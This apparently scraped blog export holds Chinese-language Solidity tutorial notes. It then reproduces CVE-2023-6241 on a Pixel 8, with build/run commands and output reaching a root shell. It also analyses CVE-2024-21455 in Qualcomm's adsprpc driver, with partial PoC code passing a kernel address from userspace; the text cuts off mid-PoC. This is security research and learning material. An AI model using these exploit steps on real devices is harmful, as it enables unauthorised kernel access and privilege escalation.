`abi.encodeWithSignature` 来编码函数调用 // 将函数签名 `&quot;transfer(address,uint256)&quot;` 和参数 `to`、`amount` 编码成字节数组。 // 需要注意的是，这里对参数类型进行了显式指定 (`uint256`)。 // 虽然示例代码中注释提到&quot;Typo is not checked&quot;，指的是函数签名字符串中的拼写错误编译器不会检查，但参数类型仍然需要匹配。 function encodeWithSignature(address to, uint256 amount) external pure returns (bytes memory) { // Typo is not checked - &quot;transfer(address, uint)&quot; return abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, to, amount); } // 使用 `abi.encodeWithSelector` 来编码函数调用 // 使用 `IERC20.transfer.selector` 获取 `transfer` 函数的选择器（selector）， // 并将选择器和参数 `to`、`amount` 编码成字节数组。 // 选择器是函数签名的 Keccak-256 哈希值的前 4 个字节。 // 需要注意的是，`encodeWithSelector` 不会检查参数类型是否正确。 function encodeWithSelector(address to, uint256 amount) external pure returns (bytes memory) { // Type is not checked - (IERC20.transfer.selector, true, amount) return abi.encodeWithSelector(IERC20.transfer.selector, to, amount); } // 使用 `abi.encodeCall` 来编码函数调用 // 将函数 `IERC20.transfer` 和参数 `(to, amount)` 编码成字节数组。 // `encodeCall` 的优势在于它会在编译时检查参数类型是否正确，避免了运行时错误。 // 这也是推荐的编码方式。 function encodeCall(address to, uint256 amount) external pure returns (bytes memory) { // Typo and type errors will not compile return abi.encodeCall(IERC20.transfer, (to, amount)); } } 0x28 ABI Decode abi.encode 和 abi.decode: abi.encode: 这个函数将任意类型的数据编码成字节数组（bytes）。 这在需要将复杂数据结构传递给其他合约或存储在区块链上时非常有用。 abi.decode: 这个函数将使用 abi.encode 编码的字节数组解码回原始数据类型。 它与 abi.encode 配合使用，可以实现数据的序列化和反序列化。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract AbiDecode { struct MyStruct { string name; uint256[2] nums; } // encode函数接收四个参数： // 一个 `uint256` 类型的 `x`， // 一个 `address` 类型的 `addr`， // 一个动态大小的 `uint256` 数组 `arr`， // 以及一个自定义结构体 `MyStruct` 类型的 `myStruct`。 // 它使用 `abi.encode` 将这些参数编码成一个字节数组并返回。 function encode( uint256 x, address addr, uint256[] calldata arr, MyStruct calldata myStruct ) external pure returns (bytes memory) { return abi.encode(x, addr, arr, myStruct); } // 接收一个字节数组 `data`，并使用 `abi.decode` 将其解码回原始数据类型。 function decode(bytes calldata data) external pure returns ( uint256 x, address addr, uint256[] memory arr, MyStruct memory myStruct ) { // (uint x, address addr, uint[] memory arr, MyStruct myStruct) = ... (x, addr, arr, myStruct) = abi.decode(data, (uint256, address, uint256[], MyStruct)); } } 需要注意的是，在调用 abi.decode 时，需要指定解码后的数据类型，例如 (uint256, address, uint256[], MyStruct)。 这确保了解码后的数据类型与编码时的数据类型一致。 0x29 Hashing with Keccak256 keccak256 用于计算输入的 Keccak-256 哈希值。 主要用途包括： 根据输入创建确定性的唯一ID 承诺-揭示方案(Commit-Reveal scheme) 紧凑的加密签名(通过对哈希值而不是更大的输入进行签名) // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract HashFunction { // 计算多个参数的组合哈希 function hash(string memory _text, uint256 _num, address _addr) public pure returns (bytes32) { return keccak256(abi.encodePacked(_text, _num, _addr)); } // 演示哈希碰撞的例子 // 当使用abi.encodePacked传入多个动态数据类型时可能发生哈希碰撞 // 这种情况下应该使用abi.encode代替 // Example of hash collision // Hash collision can occur when you pass more than one dynamic data type // to abi.encodePacked. In such case, you should use abi.encode instead. function collision(string memory _text, string memory _anotherText) public pure returns (bytes32) { // encodePacked(AAA, BBB) -&gt; AAABBB // encodePacked(AA, ABBB) -&gt; AAABBB return keccak256(abi.encodePacked(_text, _anotherText)); } } contract GuessTheMagicWord { // 预设答案的哈希值 bytes32 public answer = 0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00; // Magic word 是 &quot;Solidity&quot; // 检查输入单词的哈希是否匹配预设答案 // Magic word is &quot;Solidity&quot; function guess(string memory _word) public view returns (bool) { return keccak256(abi.encodePacked(_word)) == answer; } } keccak256: 这是一个加密哈希函数 输入可以是任意长度的数据 输出固定为32字节(256位)的哈希值 哈希结果是确定性的，相同输入始终产生相同输出 abi.encodePacked: 将多个参数打包编码成字节数组 可能导致哈希碰撞，例如： &quot;AAA&quot; + &quot;BBB&quot; = &quot;AAABBB&quot; &quot;AA&quot; + &quot;ABBB&quot; = &quot;AAABBB&quot; 处理多个动态类型数据时建议使用abi.encode代替 GuessTheMagicWord合约展示了哈希的实际应用： 存储答案的哈希值而不是明文 通过比较哈希值来验证猜测 保证答案的机密性 0x2A Verifying Signature 这种签名机制的主要应用场景： 链下授权 元交易(gasless transactions) 多重签名钱包 批量交易 延迟执行的交易 具体过程： 签名过程(链下): 创建消息 对消息进行哈希处理 使用私钥对哈希进行签名 验证过程(链上): 重新创建原始消息的哈希 从签名和哈希中恢复签名者 比较恢复的签名者和声称的签名者 主要函数说明: // 生成消息哈希 function getMessageHash(address _to, uint _amount, string memory _message, uint _nonce) 将接收地址、金额、消息和nonce打包后生成哈希。 // 生成以太坊签名消息哈希 function getEthSignedMessageHash(bytes32 _messageHash) 添加以太坊特定前缀后再次哈希,这是以太坊签名消息的标准格式。 // 验证签名 function verify(address _signer, address _to, uint _amount, string memory _message, uint _nonce, bytes memory signature) 验证签名是否由声称的签名者生成。 // 从签名恢复签名者地址 function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature) 使用ecrecover从签名中恢复出原始签名者地址。 // 分割签名数据 function splitSignature(bytes memory sig) 将签名数据分解为r、s、v三个组件,这是签名验证所需的格式。 这个合约的主要用途是: 允许用户在链下签名消息 在链上验证这些签名 可用于各种需要证明身份的场景,如交易授权等 需要注意的是,签名过程应在链下完成以保护私钥安全。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; /* Signature Verification How to Sign and Verify # Signing 1. Create message to sign 2. Hash the message 3. Sign the hash (off chain, keep your private key secret) # Verify 1. Recreate hash from the original message 2. Recover signer from signature and hash 3. Compare recovered signer to claimed signer */ contract VerifySignature { /* 1. Unlock MetaMask account ethereum.enable() */ /* 2. Get message hash to sign getMessageHash( 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C, 123, &quot;coffee and donuts&quot;, 1 ) hash = &quot;0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd&quot; */ // 消息哈希生成 // 接收4个参数：接收地址、金额、消息文本和nonce(用于防止重放攻击) // 使用abi.encodePacked()将这些参数打包成字节数组 // 使用keccak256算法计算这些打包数据的哈希值 // 返回32字节的哈希结果 function getMessageHash( address _to, uint256 _amount, string memory _message, uint256 _nonce ) public pure returns (bytes32) { return keccak256(abi.encodePacked(_to, _amount, _message, _nonce)); } /* 3. Sign message hash # using browser account = &quot;copy paste account of signer here&quot; ethereum.request({ method: &quot;personal_sign&quot;, params: [account, hash]}).then(console.log) # using web3 web3.personal.sign(hash, web3.eth.defaultAccount, console.log) Signature will be different for different accounts 0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b */ // 以太坊签名消息哈希 // 添加以太坊特定前缀&quot;\\x19Ethereum Signed Message:\\n32&quot; // 这是以太坊的标准做法，用于区分以太坊签名消息 // 防止签名被用于其他目的或其他区块链 // 返回最终要签名的哈希值 function getEthSignedMessageHash(bytes32 _messageHash) public pure returns (bytes32) { /* Signature is produced by signing a keccak256 hash with the following format: &quot;\\x19Ethereum Signed Message\\n&quot; + len(msg) + msg */ return keccak256( abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash) ); } /* 4. Verify signature signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C amount = 123 message = &quot;coffee and donuts&quot; nonce = 1 signature = 0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b */ // 签名验证 // 接收原始消息参数和签名数据 // 重新计算消息哈希 // 重新计算以太坊签名消息哈希 // 从签名中恢复签名者地址 // 比较恢复的地址与声称的签名者地址 function verify( address _signer, address _to, uint256 _amount, string memory _message, uint256 _nonce, bytes memory signature ) public pure returns (bool) { bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce); bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash); return recoverSigner(ethSignedMessageHash, signature) == _signer; } // 签名者恢复 // 将签名分解为r、s、v组件 // 使用ecrecover()函数恢复原始签名者地址 // ecrecover是以太坊内置函数，使用ECDSA椭圆曲线算法 function recoverSigner( bytes32 _ethSignedMessageHash, bytes memory _signature ) public pure returns (address) { (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature); return ecrecover(_ethSignedMessageHash, v, r, s); } // 签名分割 // 检查签名长度是否为65字节 // 使用assembly进行低级内存操作 // 提取签名的三个组成部分： // r: 第一个32字节 // s: 第二个32字节 // v: 最后1字节 // 这些参数用于ECDSA签名恢复 function splitSignature(bytes memory sig) public pure returns (bytes32 r, bytes32 s, uint8 v) { require(sig.length == 65, &quot;invalid signature length&quot;); assembly { /* First 32 bytes stores the length of the signature add(sig, 32) = pointer of sig + 32 effectively, skips first 32 bytes of signature mload(p) loads next 32 bytes starting at the memory address p into memory */ // first 32 bytes, after the length prefix r := mload(add(sig, 32)) // second 32 bytes s := mload(add(sig, 64)) // final byte (first byte of the next 32 bytes) v := byte(0, mload(add(sig, 96))) } // implicitly return (r, s, v) } } 0x2B Gas Saving Techniques 这个例子展示 Solidity gas 优化技巧。 这是一个展示 Solidity gas 优化技巧的合约示例。我来解释每个优化技巧： 原始代码消耗：50908 gas 最终优化后：47309 gas // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // gas golf contract GasGolf { // start - 50908 gas // use calldata - 49163 gas // load state variables to memory - 48952 gas // short circuit - 48634 gas // loop increments - 48244 gas // cache array length - 48209 gas // load array elements to memory - 48047 gas // uncheck i overflow/underflow - 47309 gas uint256 public total; // start - not gas optimized // function sumIfEvenAndLessThan99(uint[] memory nums) external { // for (uint i = 0; i &lt; nums.length; i += 1) { // bool isEven = nums[i] % 2 == 0; // bool isLessThan99 = nums[i] &lt; 99; // if (isEven &amp;&amp; isLessThan99) { // total += nums[i]; // } // } // } // a. 接收一个数组作为输入 // b. 遍历数组寻找符合条件的数字（偶数且小于99） // c. 将符合条件的数字加到总和中 // gas optimized // [1, 2, 3, 4, 5, 100] function sumIfEvenAndLessThan99(uint256[] calldata nums) external { // 1.calldata 替代 memory uint256 _total = total; // 2. 将状态变量加载到内存中 uint256 len = nums.length; // 4. 缓存数组长度 for (uint256 i = 0; i &lt; len;) { uint256 num = nums[i]; // 6. 缓存数组元素 if (num % 2 == 0 &amp;&amp; num &lt; 99) { // 5. 短路运算优化 _total += num; } unchecked { // 3. 优化循环增量 ++i; } } total = _total; } } 主要优化技巧： 使用 calldata 替代 memory calldata 是只读的，直接从交易数据读取 memory 需要额外的复制操作 对于外部函数的引用类型参数，优先使用 calldata // 优化前 function sumIfEvenAndLessThan99(uint[] memory nums) // 优化后 function sumIfEvenAndLessThan99(uint[] calldata nums) 将状态变量加载到内存中 减少 SLOAD/SSTORE 操作 状态变量读写是最昂贵的操作之一 // 优化前 total += nums[i]; // 优化后 uint256 _total = total; // 将状态变量加载到内存 _total += num; // 使用内存变量 total = _total; // 最后再更新状态变量 优化循环增量 ++i 比 i++ 更省 gas unchecked 块关闭溢出检查，节省 gas // 优化前 for (uint i = 0; i &lt; nums.length; i += 1) // 优化后 for (uint256 i = 0; i &lt; len;) { // 循环体 unchecked { ++i; } } 缓存数组长度 避免每次循环都读取数组长度 将数组长度缓存到内存变量中 // 优化前 for (uint i = 0; i &lt; nums.length; i++) // 优化后 uint256 len = nums.length; for (uint256 i = 0; i &lt; len;) 短路运算优化 直接在 if 条件中进行判断 避免创建额外的布尔变量 // 优化前 bool isEven = nums[i] % 2 == 0; bool isLessThan99 = nums[i] &lt; 99; if (isEven &amp;&amp; isLessThan99) // 优化后 if (num % 2 == 0 &amp;&amp; num &lt; 99) 缓存数组元素 避免多次访问数组同一位置 将数组元素缓存到内存变量中 // 优化前 if (nums[i] % 2 == 0 &amp;&amp; nums[i] &lt; 99) // 优化后 uint256 num = nums[i]; if (num % 2 == 0 &amp;&amp; num &lt; 99) 0x2C Bitwise Operators 该例子介绍位运算符的使用。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract BitwiseOps { // 【1】 与 // x = 1110 = 8 + 4 + 2 + 0 = 14 // y = 1011 = 8 + 0 + 2 + 1 = 11 // x &amp; y = 1010 = 8 + 0 + 2 + 0 = 10 function and(uint256 x, uint256 y) external pure returns (uint256) { return x &amp; y; } // 【2】或 // x = 1100 = 8 + 4 + 0 + 0 = 12 // y = 1001 = 8 + 0 + 0 + 1 = 9 // x | y = 1101 = 8 + 4 + 0 + 1 = 13 function or(uint256 x, uint256 y) external pure returns (uint256) { return x | y; } //【3】异或 // x = 1100 = 8 + 4 + 0 + 0 = 12 // y = 0101 = 0 + 4 + 0 + 1 = 5 // x ^ y = 1001 = 8 + 0 + 0 + 1 = 9 function xor(uint256 x, uint256 y) external pure returns (uint256) { return x ^ y; } //【4】取反 // x = 00001100 = 0 + 0 + 0 + 0 + 8 + 4 + 0 + 0 = 12 // ~x = 11110011 = 128 + 64 + 32 + 16 + 0 + 0 + 2 + 1 = 243 function not(uint8 x) external pure returns (uint8) { return ~x; } // 【5】左移 // 1 &lt;&lt; 0 = 0001 --&gt; 0001 = 1 // 1 &lt;&lt; 1 = 0001 --&gt; 0010 = 2 // 1 &lt;&lt; 2 = 0001 --&gt; 0100 = 4 // 1 &lt;&lt; 3 = 0001 --&gt; 1000 = 8 // 3 &lt;&lt; 2 = 0011 --&gt; 1100 = 12 function shiftLeft(uint256 x, uint256 bits) external pure returns (uint256) { return x &lt;&lt; bits; } // 【6】右移 // 8 &gt;&gt; 0 = 1000 --&gt; 1000 = 8 // 8 &gt;&gt; 1 = 1000 --&gt; 0100 = 4 // 8 &gt;&gt; 2 = 1000 --&gt; 0010 = 2 // 8 &gt;&gt; 3 = 1000 --&gt; 0001 = 1 // 8 &gt;&gt; 4 = 1000 --&gt; 0000 = 0 // 12 &gt;&gt; 1 = 1100 --&gt; 0110 = 6 function shiftRight(uint256 x, uint256 bits) external pure returns (uint256) { return x &gt;&gt; bits; } // 【7】获取x的最后 n 位 // Get last n bits from x function getLastNBits(uint256 x, uint256 n) external pure returns (uint256) { // Example, last 3 bits // x = 1101 = 13 // mask = 0111 = 7 // x &amp; mask = 0101 = 5 uint256 mask = (1 &lt;&lt; n) - 1; return x &amp; mask; } // 【8】使用取模运算获取最后 n 位 // Get last n bits from x using mod operator function getLastNBitsUsingMod(uint256 x, uint256 n) external pure returns (uint256) { // 1 &lt;&lt; n = 2 ** n return x % (1 &lt;&lt; n); } // 【9】获取最高有效位的位置 // Get position of most significant bit // x = 1100 = 12, most significant bit = 1000, so this function will return 3 function mostSignificantBit(uint256 x) external pure returns (uint256) { uint256 i = 0; while ((x &gt;&gt;= 1) &gt; 0) { ++i; } return i; } // 获取x的前n bit // Get first n bits from x // len = length of bits in x = position of most significant bit of x, + 1 function getFirstNBits(uint256 x, uint256 n, uint256 len) external pure returns (uint256) { // Example // x = 1110 = 14, n = 2, len = 4 // mask = 1100 = 12 // x &amp; mask = 1100 = 12 uint256 mask = ((1 &lt;&lt; n) - 1) &lt;&lt; (len - n); return x &amp; mask; } } Most significant bit // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract MostSignificantBitFunction { // 使用二分查找法查找最高有效位 // Find most significant bit using binary search function mostSignificantBit(uint256 x) external pure returns (uint256 msb) { // x &gt;= 2 ** 128 if (x &gt;= 0x100000000000000000000000000000000) { x &gt;&gt;= 128; msb += 128; } // x &gt;= 2 ** 64 if (x &gt;= 0x10000000000000000) { x &gt;&gt;= 64; msb += 64; } // x &gt;= 2 ** 32 if (x &gt;= 0x100000000) { x &gt;&gt;= 32; msb += 32; } // x &gt;= 2 ** 16 if (x &gt;= 0x10000) { x &gt;&gt;= 16; msb += 16; } // x &gt;= 2 ** 8 if (x &gt;= 0x100) { x &gt;&gt;= 8; msb += 8; } // x &gt;= 2 ** 4 if (x &gt;= 0x10) { x &gt;&gt;= 4; msb += 4; } // x &gt;= 2 ** 2 if (x &gt;= 0x4) { x &gt;&gt;= 2; msb += 2; } // x &gt;= 2 ** 1 if (x &gt;= 0x2) msb += 1; } } 改一下格式更好看： // 使用二分查找法查找最高有效位 function mostSignificantBit(uint256 x) external pure returns (uint256 msb) { // 通过二分查找快速定位最高位 if (x &gt;= 0x100000000000000000000000000000000) { x &gt;&gt;= 128; msb += 128; } if (x &gt;= 0x10000000000000000) { x &gt;&gt;= 64; msb += 64; } if (x &gt;= 0x100000000) { x &gt;&gt;= 32; msb += 32; } if (x &gt;= 0x10000) { x &gt;&gt;= 16; msb += 16; } if (x &gt;= 0x100) { x &gt;&gt;= 8; msb += 8; } if (x &gt;= 0x10) { x &gt;&gt;= 4; msb += 4; } if (x &gt;= 0x4) { x &gt;&gt;= 2; msb += 2; } if (x &gt;= 0x2) msb += 1; } Most significant bit in assembly Assembly 版本的最高有效位查找：使用汇编代码实现，通过更底层的操作提高效率。 shl: 左移 shr: 右移 gt: 大于比较 or: 位或操作 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract MostSignificantBitAssembly { function mostSignificantBit(uint256 x) external pure returns (uint256 msb) { assembly { let f := shl(7, gt(x, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)) x := shr(f, x) // or can be replaced with add msb := or(msb, f) } assembly { let f := shl(6, gt(x, 0xFFFFFFFFFFFFFFFF)) x := shr(f, x) msb := or(msb, f) } assembly { let f := shl(5, gt(x, 0xFFFFFFFF)) x := shr(f, x) msb := or(msb, f) } assembly { let f := shl(4, gt(x, 0xFFFF)) x := shr(f, x) msb := or(msb, f) } assembly { let f := shl(3, gt(x, 0xFF)) x := shr(f, x) msb := or(msb, f) } assembly { let f := shl(2, gt(x, 0xF)) x := shr(f, x) msb := or(msb, f) } assembly { let f := shl(1, gt(x, 0x3)) x := shr(f, x) msb := or(msb, f) } assembly { let f := gt(x, 0x1) msb := or(msb, f) } } } 0x2D Unchecked Math Solidity 0.8+ 版本中的溢出(overflow)和下溢(underflow)检查，使用 unchecked 来禁用这些检查可以节省 gas。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract UncheckedMath { function add(uint256 x, uint256 y) external pure returns (uint256) { // 22291 gas // return x + y; // unchecked{} 括起来 // 22103 gas unchecked { return x + y; } } function sub(uint256 x, uint256 y) external pure returns (uint256) { // 22329 gas // return x - y; // 22147 gas unchecked { return x - y; } } function sumOfCubes(uint256 x, uint256 y) external pure returns (uint256) { // Wrap complex math logic inside unchecked unchecked { uint256 x3 = x * x * x; uint256 y3 = y * y * y; return x3 + y3; } } } 0x2E Assembly Variable 如何在assembly内部声明变量。 Yul 语言特性： Yul 是以太坊的低级语言 用于编写内联汇编代码 语法比 Solidity 更简单直接 变量声明： let 关键字用于声明局部变量 := 用于赋值（不是 Solidity 中的 =） 变量 x 只在 assembly 块内有效 返回值赋值 直接给函数返回变量赋值 不需要 return 语句 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract AssemblyVariable { function yul_let() public pure returns (uint256 z) { assembly { // 在这里使用 Yul 语言 // Language used for assembly is called Yul // Local variables let x := 123 // 声明并初始化局部变量 z := 456 // 给返回变量赋值 } } } 0x2F Assembly Conditional Statements // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract AssemblyIf { function yul_if(uint256 x) public pure returns (uint256 z) { assembly { // if condition = 1 { code } // no else if 语句在汇编中没有 else 分支 // if 0 { z := 99 } 条件必须计算为 0 (false) 或非 0 (true) // if 1 { z := 99 } if lt(x, 10) { z := 99 } // 检查 x 是否小于 10 (less than) } } function yul_switch(uint256 x) public pure returns (uint256 z) { assembly { switch x case 1 { z := 10 } // case 后面必须是常量值 case 2 { z := 20 } default { z := 0 } } } } 0x30 Assembly Loop // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract AssemblyLoop { // for循环 function yul_for_loop() public pure returns (uint256 z) { assembly { // for { 初始化 } 条件 { 更新 } { 循环体 } for { let i := 0 } lt(i, 10) { i := add(i, 1) } { z := add(z, 1) } } } // while循环：用for来实现 function yul_while_loop() public pure returns (uint256 z) { // 空初始化和空更新部分的 for 循环 = while 循环 assembly { let i := 0 for {} lt(i, 5) {} { i := add(i, 1) z := add(z, 1) } } } } 0x31 Assembly Error // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract AssemblyError { function yul_revert(uint256 x) public pure { assembly { // revert(p, s) - end execution // revert state changes // return data mem[p…(p+s)) // 如果 x &gt; 10，则回滚交易 if gt(x, 10) { revert(0, 0) } } } } revert 函数说明： revert(p, s) 有两个参数： p：内存位置（指针） s：数据大小（长度） 功能： 终止执行 回滚所有状态改变 返回内存中从位置 p 开始，长度为 s 的数据 0x32 Assembly Math // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract AssemblyMath { // 加 function yul_add(uint256 x, uint256 y) public pure returns (uint256 z) { assembly { // 执行加法 z := add(x, y) // 检查溢出：如果结果小于其中一个操作数，说明发生了溢出 if lt(z, x) { revert(0, 0) } } } // 乘 function yul_mul(uint256 x, uint256 y) public pure returns (uint256 z) { assembly { switch x case 0 { z := 0 } default { z := mul(x, y) // 检查溢出：如果 z/x != y，说明发生了溢出 if iszero(eq(div(z, x), y)) { revert(0, 0) } } } } // 定点数舍入 // Round to nearest multiple of b function yul_fixed_point_round(uint256 x, uint256 b) public pure returns (uint256 z) { assembly { // b = 100 // x = 90 // z = 90 / 100 * 100 = 0, want z = 100 // z := mul(div(x, b), b) let half := div(b, 2) // 计算 b 的一半 z := add(x, half) // 将输入值加上 half 以实现四舍五入 z := mul(div(z, b), b) // 除以 b 再乘以 b 得到最近的倍数 // x = 90 // half = 50 // z = 90 + 50 = 140 // z = 140 / 100 * 100 = 100 } } } 参考文献 https://solidity-by-example.org/ ","link":"https://lzxzl.github.io/post/solidity-ru-men-bi-ji/"},{"title":"CVE-2023-6241分析与复现","content":" 对这篇文章 Gaining kernel code execution on an MTE-enabled Pixel 8 的分析与复现 Arm Mali GPU （买了台 pixel8，也刚好拿来当备用机~） 镜像版本：UD1A.231105.004 ndk版本：26.2.11394342 open-cl header版本：v2023.04.17 复现 编译 # 1. 拉依赖库 ╰─ adb pull vendor/lib64/egl/libGLES_mali.so . # 2. 拷贝opencl header到exp目录 ╰─ cp -r ../OpenCL-Headers-2023.04.17/CL . # 3. 编译 ╰─ /Users/lzx/Library/Android/sdk/ndk/26.2.11394342/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android34-clang -DSHELL -DCL_TARGET_OPENCL_VERSION=300 -I. -L. mali_jit_csf.c mem_read_write.c mempool_utils.c -lGLES_mali -o mali_jit_csf # 4. 得到 mali_jit_csf 运行 ╰─ adb push mali_jit_csf /data/local/tmp ╰─ adb shell shiba:/ $ cd /data/local/tmp shiba:/data/local/tmp $ LD_LIBRARY_PATH=/vendor/lib64/egl ./mali_jit_csf mali_fd 3 corrupted_jit_addr 6000001000 kernel success kernel success queue kernel jit_grow addr 6000001000 Size after grow: 22f6 Final grow size: 23c7 keep alive jit_addr 60023d1000 Size after free: 21fd, trim_level 6 writing to gpu_va 6002301000 found reused page 5fffef6000, 0 pgd entry found at index 0 400008972ef443 overwrite addr : 5ffff00b50 b50 overwrite addr : 5fffb00b50 b50 overwrite addr : 5fff900b50 b50 overwrite addr : 5ffff00714 714 overwrite addr : 5fffb00714 714 overwrite addr : 5fff900714 714 result 50 shiba:/data/local/tmp # id uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0 shiba:/data/local/tmp # getenforce getenforce: Couldn't get enforcing status: No such file or directory 1|shiba:/data/local/tmp # ^C 130|shiba:/data/local/tmp # ^D shiba:/data/local/tmp $ 第一次运行的时候，确实如readme里所说卡住了，第二次运行就没事了。 When running the first time, the exploit sometimes stalls after printing the last overwrite addr message. If that happens (stalled for more than 10 seconds, though pausing for a few seconds is normal), then simply kill the exploit and rerun it. It should not stall the second time. 漏洞根因 PoC Patch 结论 参考文献 https://github.blog/security/vulnerability-research/gaining-kernel-code-execution-on-an-mte-enabled-pixel-8/ https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2023_6241 https://developers.google.com/android/images?hl=zh-cn https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17 ","link":"https://lzxzl.github.io/post/cve-2023-6241-fen-xi-yu-fu-xian/"},{"title":"CVE-2024-21455 is_compat flag leads to access of userland provided addresses as kernel pointers","content":" qualcomm-dsp-driver: adsprpc 漏洞 为了支持 32 位用户空间进程，64 位内核包含一个可以支持 ioctl 的“兼容层”（compatibility layer）。这个层的职责是将 32 位结构体转换为它们的 64 位等价结构体，这涉及将 32 位用户空间指针“扩展”为 64 位指针。adsprpc 驱动在 adsprpc_compat.c 文件中处理这种情况。它会分配内核内存，将 32 位结构体拷贝并转换为 64 位结构体，然后调用 64 位的 ioctl 接口。因此，64 位的 ioctl 接口必须处理来自 32 位内核兼容层的调用以及直接来自 64 位用户空间的调用。 为了支持这种功能，32 位兼容层通过在与文件描述符绑定的 fl 结构体（fastrpc_file）中设置 is_compat 标志，向更广泛的 adsprpc 驱动表明当前调用来自 32 位兼容层。 long compat_fastrpc_device_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { int err = 0; struct fastrpc_file *fl = (struct fastrpc_file *)filp-&gt;private_data; if (!filp-&gt;f_op || !filp-&gt;f_op-&gt;unlocked_ioctl) return -ENOTTY; fl-&gt;is_compat = true; // 设置is_compat flag为true ... } 稍后，在调用 K_COPY_FROM_USER 时会使用 is_compat 标志来决定是使用 memmove（适用于 32 位兼容层或其他内核调用）还是 copy_from_user。 #define K_COPY_FROM_USER(err, kernel, dst, src, size) \\ do {\\ if (!(kernel))\\ err = copy_from_user((dst),\\ (void const __user *)(src),\\ (size));\\ else\\ memmove((dst), (src), (size));\\ } while (0) 函数 fastrpc_internal_invoke2 的片段如下： int fastrpc_internal_invoke2(struct fastrpc_file *fl, struct fastrpc_ioctl_invoke2 *inv2) { switch (inv2-&gt;req) { case FASTRPC_INVOKE2_ASYNC: ... K_COPY_FROM_USER(err, fl-&gt;is_compat, &amp;p.inv3, (void*)inv2-&gt;invparam, sizeof(struct fastrpc_ioctl_invoke_async_no_perf)); ... } } 然而，这个 is_compat 标志被设置在一个相对全局的级别上，因此对同一文件描述符的任何其他 ioctl 调用都会看到该标志已被设置。此外，一旦该标志被设置，就永远不会被重置。以下是一个可能的恶意场景： 一个恶意的 64 位进程 A 打开了 adsprpc-smd 文件，创建了一个新的 adsprpc 文件描述符。 进程 A 调用 fork，创建了一个新的 32 位进程 B（A 和 B 共享 adsprpc fd/fl）。 进程 B 调用 32 位的 ioctl 接口（从而设置了 is_compat 标志）并退出。 进程 A 调用 64 位的 ioctl 接口。 在这种情况下，驱动程序错误地认为请求来自 32 位兼容层（因为 is_compat 被设置了），并尝试将(void*)inv2-&gt;invparam作为内核指针进行访问，而实际上这是一个来自 64 位用户空间的不可信用户空间指针（在恶意情况下，这些指针可能是内核地址）(copy_from_user的src)。随后内核将使用不安全的 memmove 来访问这些指针，从而导致用户空间控制的内核地址读操作。 memove函数：将内存区域中的一段数据复制到另一段内存区域中 void *memmove(void *dest, const void *src, size_t n); // dest: 目标地址指针，表示数据要复制到的内存区域的起始地址 // src: 源地址指针，表示数据要复制的内存区域的起始地址。 // n: 要复制的字节数 漏洞模式小结 有兼容层 表明兼容层的is_compat 标志被设置在一个相对全局的级别上 对同一文件描述符的任何其他 ioctl 调用都会看到该标志已被设置 一旦该标志被设置，就永远不会被重置或者存在情况不会被重置 比如该漏洞的is_compat就存储在父子进程共享的fastrpc_file里 驱动对用户态传入地址的处理在同一个地方。 PoC 父进程 int main() { int adsprpc_fd = open(&quot;/dev/adsprpc-smd&quot;,O_RDONLY); // [1] 恶意的 64 位进程 A 打开了 `adsprpc-smd` 文件，创建了一个新的 `adsprpc` 文件描述符。 if(adsprpc_fd == -1) { printf(&quot;open: %m\\n&quot;); return 1; } printf(&quot;opened fd %d\\n&quot;, adsprpc_fd); uint32_t info = 3; // 0 is privileged, 3 is unprivileged int getinfo_res = ioctl(adsprpc_fd, FASTRPC_IOCTL_GETINFO, &amp;info); printf(&quot;getinfo returned %d\\n&quot;, getinfo_res); printf(&quot;invoking child\\n&quot;); char* arg[] = {&quot;./poc_compat&quot;, NULL}; if(!fork()) { // [2] 进程 A 调用 `fork`，创建了一个新的 32 位进程 B（A 和 B 共享 `adsprpc` fd/fl）。 execve(&quot;./poc_compat&quot;,arg,NULL); // 子进程执行poc_compat printf(&quot;execve: %m\\n&quot;); return 1; } int ret = waitpid(-1,NULL,0); if(ret &lt; 0) { printf(&quot;waitpid: %m\\n&quot;); return 1; } printf(&quot;child exited\\n&quot;); struct fastrpc_ioctl_invoke2 p = { .req = FASTRPC_INVOKE2_ASYNC, .invparam = 0xffffffff41414141, .size = 8 }; errno = 0; int res = ioctl(adsprpc_fd,FASTRPC_IOCTL_INVOKE2,&amp;p); // [4] 进程 A 调用 64 位的 `ioctl` 接口 printf(&quot;invoke2 called, returned %d (%m)\\n&quot;, res); } 子进程 int main() { printf(&quot;calling ioctl\\n&quot;); struct fastrpc_ioctl_dspsignal_wait arg = { 